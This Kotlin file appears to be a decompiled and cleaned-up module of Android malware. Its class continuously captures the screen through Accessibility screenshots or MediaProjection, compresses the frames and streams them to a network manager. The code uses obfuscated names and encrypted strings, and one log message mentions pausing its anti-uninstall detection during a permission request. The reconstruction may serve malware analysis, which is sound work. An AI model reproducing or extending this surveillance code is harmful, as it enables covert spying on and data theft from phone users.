package com.storm.safe.rock.manager

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.os.Build
import android.util.Log
import com.storm.safe.rock.activity.qixvbtmo
import com.storm.safe.rock.service.MediaDisplayService
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.util.StringUtil
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.ThreadPoolExecutor
import java.util.concurrent.TimeUnit
import java.util.concurrent.locks.ReentrantLock

/**
 * Display/screen capture manager using Accessibility takeScreenshot or MediaProjection.
 *
 * Reverse-engineered from JADX: manager/C0263a5.java (531 LOC).
 *
 * Features:
 * - Accessibility-based screenshot (API 30+)
 * - MediaProjection fallback
 * - Bitmap compression (WebP) with scale-down
 * - Night mode filter support
 * - Vivo device detection for safe intervals
 * - Pause/resume capture
 * - Thread-safe bitmap operations with ReentrantLock
 */
class C0263a5(
    private val accessibilityService: MyAccessibilityService
) {
    companion object {
        const val TAG = "etzbzyzqxvqm"

        /** Max width for placeholder image */
        const val MAX_WIDTH = 480

        /** Max height for placeholder image */
        private const val MAX_HEIGHT = 854

        /** Scale target width for bitmap compression */
        const val SCALE_TARGET_WIDTH = 240

        /** Default compression quality (WebP) */
        @Volatile
        @JvmStatic
        var compressionQuality: Int = 20

        /** Default scale factor */
        @Volatile
        @JvmStatic
        var scaleFactor: Float = 0.5f

        /** Default FPS limit */
        @Volatile
        @JvmStatic
        var fpsLimit: Int = 10

        /** Default capture mode (encrypted string from JADX) */
        @JvmStatic
        val DEFAULT_CAPTURE_MODE: String = StringUtil.decrypt("KloSP14rBSxePSJNCA==")

        /** Whether screenshot callback API is supported (null = unknown) */
        @Volatile
        private var screenshotSupported: Boolean? = null

        /** Whether current device is Vivo */
        private val isVivoDevice: Boolean by lazy {
            Build.MANUFACTURER.equals("vivo", ignoreCase = true)
        }

        /**
         * Scale down bitmap to target width preserving aspect ratio.
         * JADX: m211348b2
         */
        @JvmStatic
        fun scaleDownBitmap(bitmap: Bitmap): Bitmap? {
            if (bitmap.isRecycled) {
                Log.w(TAG, "⚠️ scaleDownBitmapLocked: Bitmap 已被回收")
                return null
            }
            val width = bitmap.width
            val height = bitmap.height
            if (width <= 0 || height <= 0) {
                Log.w(TAG, "⚠️ scaleDownBitmapLocked: Bitmap 尺寸无效 ${width}x${height}")
                return null
            }
            if (width <= SCALE_TARGET_WIDTH) return bitmap
            val targetHeight = (height.toFloat() / width * SCALE_TARGET_WIDTH).toInt()
            return try {
                Bitmap.createScaledBitmap(bitmap, SCALE_TARGET_WIDTH, targetHeight, true)
            } catch (e: Exception) {
                Log.e(TAG, "⚠️ scaleDownBitmapLocked: 创建缩放 Bitmap 失败", e)
                null
            }
        }

        /**
         * Generate a placeholder bitmap when no screenshot permission.
         * JADX: m211345a2
         */
        @JvmStatic
        fun generatePlaceholderBitmap(): Bitmap? {
            return try {
                val bmp = Bitmap.createBitmap(MAX_WIDTH, MAX_HEIGHT, Bitmap.Config.ARGB_8888)
                val canvas = Canvas(bmp)
                canvas.drawColor(Color.parseColor("#1a1a2e"))
                val paint = Paint().apply {
                    isAntiAlias = true
                    textAlign = Paint.Align.CENTER
                    color = Color.WHITE
                    textSize = 24f
                }
                canvas.drawText("等待截图权限", 240f, 377f, paint)
                paint.textSize = 16f
                paint.color = Color.parseColor("#888888")
                canvas.drawText(
                    SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date()),
                    240f, 457f, paint
                )
                bmp
            } catch (e: Exception) {
                Log.e(TAG, "生成测试图像失败", e)
                null
            }
        }

        /**
         * Reset screenshot API support status.
         */
        @JvmStatic
        fun resetScreenshotSupport() {
            screenshotSupported = null
        }
    }

    // ── Instance fields ──

    /** Whether capture is currently active */
    @Volatile
    var isCapturing: Boolean = false
        private set

    /** Whether capture is paused */
    @Volatile
    var isPaused: Boolean = false
        private set

    /** Current capture mode */
    var captureMode: String = DEFAULT_CAPTURE_MODE

    /** Capture coroutine job */
    private var captureJob: Job? = null

    /** Screenshot executor pool */
    @Volatile
    private var screenshotExecutor: ThreadPoolExecutor = ThreadPoolExecutor(
        1, 2, 15L, TimeUnit.SECONDS, LinkedBlockingQueue()
    )

    /** Minimum interval between screenshots (adaptive) */
    @Volatile
    var captureInterval: Long = if (isVivoDevice) 200L else 100L
        private set

    /** Last captured bitmap (for reuse) */
    private var lastBitmap: Bitmap? = null

    /** Timestamp of last screenshot */
    private var lastScreenshotTime: Long = 0L

    /** Lock for bitmap operations */
    private val bitmapLock = ReentrantLock()

    /** Coroutine scope for capture */
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // ── Capture API ──

    /**
     * Take accessibility screenshot (API 30+).
     * JADX: m211343a0 + m211349a5
     */
    fun takeAccessibilityScreenshot(): Bitmap? {
        if (Build.VERSION.SDK_INT < 30 || screenshotSupported == false) return null

        // Check if API is available
        if (screenshotSupported == null) {
            try {
                Class.forName(
                    "android.accessibilityservice.AccessibilityService\$TakeScreenshotCallback",
                    false, C0263a5::class.java.classLoader
                )
                if (isVivoDevice && captureInterval < 350) {
                    captureInterval = 350L
                }
            } catch (th: Throwable) {
                Log.w(TAG, "⚠️ 此设备不支持 TakeScreenshotCallback API: ${th.javaClass.simpleName}")
                screenshotSupported = false
                return null
            }
        }

        try {
            val now = System.currentTimeMillis()
            val minInterval = if (isVivoDevice) 150L else 50L
            if (now - lastScreenshotTime < minInterval) return null
            return doTakeScreenshot(now)
        } catch (e: Exception) {
            Log.e(TAG, "无障碍截图失败", e)
            return null
        } catch (e: NoClassDefFoundError) {
            Log.w(TAG, "⚠️ TakeScreenshotCallback 类加载失败: ${e.message}")
            screenshotSupported = false
            return null
        } catch (e: LinkageError) {
            Log.w(TAG, "⚠️ TakeScreenshotCallback 链接错误: ${e.message}")
            screenshotSupported = false
            return null
        }
    }

    /**
     * Perform the actual screenshot via AccessibilityService.takeScreenshot.
     * JADX: m211349a5
     */
    private fun doTakeScreenshot(timestamp: Long): Bitmap? {
        val ref = arrayOfNulls<Bitmap>(1)
        val latch = CountDownLatch(1)
        lastScreenshotTime = timestamp

        try {
            if (screenshotExecutor.isShutdown || screenshotExecutor.isTerminated) {
                Log.w(TAG, "⚠️ screenshotExecutor 已关闭，重新创建")
                screenshotExecutor = ThreadPoolExecutor(
                    1, 2, 15L, TimeUnit.SECONDS, LinkedBlockingQueue()
                )
            }
            // JADX: m211349a5 — calls accessibilityService.takeScreenshot(0, executor, callback)
            // Real impl uses AccessibilityService.takeScreenshot API 30+
            if (Build.VERSION.SDK_INT >= 30) {
                accessibilityService.takeScreenshot(
                    0, screenshotExecutor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(screenshot: AccessibilityService.ScreenshotResult) {
                            try {
                                val bitmap = Bitmap.wrapHardwareBuffer(
                                    screenshot.hardwareBuffer, screenshot.colorSpace
                                )
                                ref[0] = bitmap
                            } catch (e: Exception) {
                                Log.e(TAG, "Screenshot conversion failed", e)
                            } finally {
                                screenshot.hardwareBuffer.close()
                                latch.countDown()
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            latch.countDown()
                        }
                    }
                )
            } else {
                latch.countDown()
            }
        } catch (e: Exception) {
            Log.e(TAG, "takeScreenshot 调用失败", e)
            latch.countDown()
        }

        val timeoutMs = if (isVivoDevice) 400L else 500L
        if (latch.await(timeoutMs, TimeUnit.MILLISECONDS)) {
            if (ref[0] != null) {
                // Adaptively reduce interval on success
                val minInterval = if (isVivoDevice) 350L else 300L
                if (captureInterval > minInterval) {
                    val reduced = (captureInterval * 95) / 100
                    captureInterval = reduced.coerceAtLeast(minInterval)
                }
            }
            return ref[0]
        }

        Log.w(TAG, "截图超时（${timeoutMs}ms）interval=${captureInterval}ms")
        return null
    }

    /**
     * Compress bitmap to WebP byte array.
     * JADX: m211344a1
     */
    fun compressBitmap(bitmap: Bitmap): ByteArray {
        var scaled: Bitmap? = null
        try {
            bitmapLock.lock()
            try {
                if (bitmap.isRecycled) {
                    Log.w(TAG, "⚠️ compressBitmap: Bitmap 已被回收，跳过压缩")
                    return ByteArray(0)
                }

                scaled = scaleDownBitmap(bitmap)
                val isNewBitmap = scaled != null && scaled !== bitmap

                if (scaled == null || scaled.isRecycled) {
                    Log.w(TAG, "⚠️ compressBitmap: 缩放后的 Bitmap 无效，跳过压缩")
                    if (isNewBitmap && scaled != null && !scaled.isRecycled) scaled.recycle()
                    return ByteArray(0)
                }
            } finally {
                bitmapLock.unlock()
            }

            val baos = ByteArrayOutputStream()
            baos.use { stream ->
                @Suppress("DEPRECATION")
                val format = if (Build.VERSION.SDK_INT >= 30) {
                    Bitmap.CompressFormat.WEBP_LOSSY
                } else {
                    Bitmap.CompressFormat.WEBP
                }

                if (!scaled!!.isRecycled) {
                    scaled.compress(format, compressionQuality, stream)
                }
                val result = stream.toByteArray()
                if (scaled !== bitmap && !scaled.isRecycled) scaled.recycle()
                return result
            }
        } catch (e: Exception) {
            Log.e(TAG, "压缩失败", e)
            if (scaled != null && scaled !== bitmap && !scaled.isRecycled) {
                try { scaled.recycle() } catch (_: Exception) {}
            }
            return ByteArray(0)
        }
    }

    /**
     * Send frame data to NetworkManager.
     * JADX: m211346a3
     */
    fun sendFrameData(data: ByteArray) {
        if (data.isEmpty()) return
        try {
            // JADX: m211346a3 — sends via NetworkManager.m211665d1(bArr) (sendScreenFrame)
            val networkManager = accessibilityService.getNetworkManager()
            networkManager?.sendScreenFrame(data)
        } catch (e: Exception) {
            Log.e(TAG, "发送帧数据失败", e)
        }
    }

    // ── Capture lifecycle ──

    /**
     * Start capture (accessibility or mediaprojection mode).
     * JADX: m211356b3
     */
    fun startCapture() {
        if (isCapturing) {
            Log.w(TAG, "捕获已在运行")
            return
        }
        if (isPaused) return

        if (captureMode == "mediaprojection") {
            startMediaProjectionCapture()
        } else {
            startAccessibilityCapture()
        }
    }

    /**
     * Stop capture and release resources.
     * JADX: m211357b4
     */
    fun stopCapture() {
        captureJob?.cancel()
        captureJob = null
        isCapturing = false
        isPaused = false
        try {
            accessibilityService.getSharedPreferences("screen_capture_pause_state", 0)
                .edit().putBoolean("is_paused", false).apply()
        } catch (_: Exception) {}

        if (captureMode == "mediaprojection" || MediaDisplayService.isRunning()) {
            try {
                // JADX: MediaDisplayService.f52303c1.stop(this.f52151a0)
                MediaDisplayService.stop(accessibilityService)
            } catch (_: Exception) {}
        }
    }

    /**
     * Pause capture.
     * JADX: m211352a8
     */
    fun pauseCapture() {
        isPaused = true
        savePauseState()
        if (captureMode == "mediaprojection") {
            // JADX: MediaDisplayService.f52303c1.getInstance()?.f52321b2 = true (paused flag)
            MediaDisplayService.getInstance()?.isPaused = true
        }
    }

    /**
     * Resume capture.
     * JADX: m211354b0
     */
    fun resumeCapture() {
        isPaused = false
        savePauseState()
        if (captureMode == "mediaprojection") {
            // JADX: MediaDisplayService.f52303c1.getInstance()?.f52321b2 = false (resume flag)
            MediaDisplayService.getInstance()?.isPaused = false
        }
        if (!isCapturing) {
            startCapture()
        }
    }

    /**
     * Reset capture state to defaults.
     * JADX: m211350a6
     */
    fun resetCapture() {
        stopCapture()
        bitmapLock.lock()
        try {
            lastBitmap?.let { if (!it.isRecycled) try { it.recycle() } catch (_: Exception) {} }
            lastBitmap = null
        } finally {
            bitmapLock.unlock()
        }
        lastScreenshotTime = 0L
        captureInterval = if (isVivoDevice) 350L else 300L
        resetScreenshotSupport()
    }

    /**
     * Request media projection permission.
     * JADX: m211353a9
     */
    fun requestMediaProjectionPermission() {
        try {
            MyAccessibilityService.isPermissionRequesting = true
            Log.d(TAG, "📺 已设置权限请求标志，暂停防卸载检测")
            // JADX: Intent(dqtvuisjdVar, qixvbtmo.class) — media projection permission activity
            val intent = Intent(accessibilityService, qixvbtmo::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                if (Build.VERSION.SDK_INT >= 29) {
                    addFlags(Intent.FLAG_ACTIVITY_REQUIRE_NON_BROWSER)
                }
            }
            accessibilityService.startActivity(intent)
            Log.d(TAG, "📺 已启动投屏权限请求 Activity")
        } catch (e: Exception) {
            Log.e(TAG, "❌ 启动投屏权限请求失败: ${e.message}", e)
            MyAccessibilityService.isPermissionRequesting = false
        }
    }

    /**
     * Handle media projection permission result.
     * JADX: m211351a7
     */
    fun onMediaProjectionPermissionResult() {
        scope.launch {
            // JADX: etzbzyzqxvqm$onMediaProjectionPermissionResult$1 — starts capture after permission granted
            startCapture()
        }
    }

    /**
     * Switch to accessibility capture mode.
     * JADX: m211358b5
     */
    fun switchToAccessibilityMode() {
        scope.launch {
            // JADX: etzbzyzqxvqm$switchToAccessibilityMode$1 — stops mediaprojection, switches to accessibility mode
            captureMode = DEFAULT_CAPTURE_MODE
            stopCapture()
            startCapture()
        }
    }

    // ── Private helpers ──

    private fun startAccessibilityCapture() {
        captureJob?.cancel()
        isCapturing = true
        val interval = if (isVivoDevice) {
            captureInterval.coerceAtLeast(300L)
        } else {
            captureInterval
        }
        if (isVivoDevice) {
            Log.d(TAG, "📱 Vivo 设备检测到，使用安全截图间隔: ${interval}ms")
        }
        captureJob = scope.launch {
            while (isCapturing && !isPaused) {
                try {
                    val bitmap = takeAccessibilityScreenshot()
                    if (bitmap != null) {
                        val compressed = compressBitmap(bitmap)
                        sendFrameData(compressed)
                    } else {
                        delay(50)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "截图循环错误", e)
                    delay(100)
                }
            }
        }
    }

    private fun startMediaProjectionCapture() {
        if (!MediaDisplayService.isProjecting) {
            scope.launch {
                // JADX: etzbzyzqxvqm$startMediaProjectionCapture$2 — requests permission then starts
                requestMediaProjectionPermission()
            }
            return
        }
        isCapturing = true
        // JADX: MediaDisplayService.getInstance().f52323b4 = frameCallback (h10)
        // Sets frame callback on MediaDisplayService to forward frames via sendFrameData
        val service = MediaDisplayService.getInstance()
        if (service != null) {
            service.frameCallback = { frameData: ByteArray ->
                sendFrameData(frameData)
            }
        }
    }

    private fun savePauseState() {
        try {
            accessibilityService.getSharedPreferences("screen_capture_pause_state", 0)
                .edit().putBoolean("is_paused", isPaused).apply()
        } catch (_: Exception) {}
    }

    /**
     * Release all resources.
     */
    fun release() {
        stopCapture()
        scope.cancel()
    }
}
